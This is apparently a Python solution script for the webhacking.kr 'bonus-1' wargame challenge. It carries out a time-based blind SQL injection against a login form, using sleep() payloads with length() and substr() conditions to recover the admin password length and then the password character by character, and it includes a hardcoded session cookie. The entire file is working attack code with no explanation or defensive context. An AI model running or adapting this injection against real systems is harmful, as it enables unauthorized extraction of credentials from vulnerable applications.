import requests
import time
import string 

url = "https://webhacking.kr/challenge/bonus-1/?"
cookie = {'PHPSESSID':'f017rl6m2tdsu0p4hlsdlpj6nh'}

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        start = time.time()
        query = "id=admin&pw=' or id='admin' and length(pw)={} and sleep(3)%23".format(pw_len)
        print(query)
        res = requests.get(url=url+query,cookies=cookie)
        end = time.time() - start
        if end > 2.5:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len

def pw_char(pw_len):
    passwd = ""
    for i in range(1, pw_len+1):
        for j in string.printable:
            start = time.time()
            query = "id=admin&pw=' or id='admin' and substr(pw,{},1)='{}' and sleep(1)%23".format(i,j)
            print(query)
            res = requests.get(url=url+query,cookies=cookie)
            end = time.time() - start
            if end > 0.8:
                print("PASSWORD CHAR : " + j)
                passwd += j
                break
    print("PASSWORD : " + passwd)

if __name__ == "__main__":
    pw_len = pw_length()
    pw_char(pw_len)
